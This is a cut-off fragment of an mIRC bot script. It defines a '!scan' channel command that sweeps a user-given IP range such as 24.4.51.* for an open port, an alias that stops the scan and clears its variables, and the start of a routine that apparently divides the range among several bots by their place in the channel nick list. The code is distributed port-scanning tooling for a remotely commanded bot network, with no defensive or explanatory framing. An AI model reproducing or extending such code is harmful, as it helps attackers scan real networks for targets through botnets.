n73=alias bishazz { /sockclose ip* |  timers off |  unset %begshortip |  unset %beglongip |  unset %endshortip |  unset %endlongip |  unset %port |  unset %botchan |  unset %botnum |  unset %ip* |  unset %loop |  unset %multiply |  unset %total |  unset %totalscaning }
n74=on 10:text:!scan*:#:{ 
n75=  if ($2 == $null) || ($3 == $null) { msg # Error/Syntax: !scan 24.4.51.* [port] | halt }
n76=  if (* !isin $2) { msg # 12 Error! !scan 24.4.51.* [port]  (please) | halt }
n77=else {   set %begshortip $replace($2,*,1)  |   set %beglongip $longip( %begshortip ) |   set %endshortip $replace($2,*,255)  |   set %endlongip $longip( %endshortip ) |   set %port $3  |  set %botchan $chan  |   /msg $chan [Scanner Started] %begshortip to %endshortip $+ ... [port: $+ %port $+ ] |   /startscanning   } }
n78=alias startscanning {  :loop |  inc %loop | if $nick( %botchan , %loop ,a) == $me {  set %multiply $calc( %loop -1)   |  unset %loop |  goto end   }
